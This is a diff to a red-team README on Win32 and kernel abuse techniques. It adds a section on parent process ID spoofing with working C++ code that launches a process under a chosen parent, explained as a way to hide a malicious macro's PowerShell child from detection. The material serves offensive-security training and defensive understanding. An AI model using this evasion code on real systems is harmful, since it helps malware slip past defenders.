@@ -70,7 +70,7 @@ Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVisi
 - [Fresh copy unhook](#fresh-copy-unhook)
 - [Hell's Gate ⏳]()
 - [Heaven's Gate](#heavens-gate)
-- [PPID spoofing ⏳]()
+- [PPID spoofing](#ppid-spoofing)
 
 
 **Driver Programming basics**
@@ -527,3 +527,35 @@ bcdedit.exe -set TESTSIGNING ON
 Then restart your computer;obviously you need local admin rights on the machine you want to execute these command. As a restart is needed, **this not opsec at all**.
 
 
+## PPID Spoofing
+
+When a suspicious/anormal process start below a "legit" or unattended process parent, it become very suspicious. Think about a malicious Word macro which deploy a powershell process : such strange, right ?
+
+PPID Spoofing can avoid that by allowing you to modify the parent process id (PPID) of your spawned process.
+
+```cpp
+#include <windows.h>
+#include <TlHelp32.h>
+#include <iostream>
+
+//code from : https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing
+int main() 
+{
+	STARTUPINFOEXA si;
+	PROCESS_INFORMATION pi;
+	SIZE_T attributeSize;
+	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
+	
+	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 6200);
+
+	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
+	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
+	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
+	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
+	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
+
+	return 0;
+}
+```
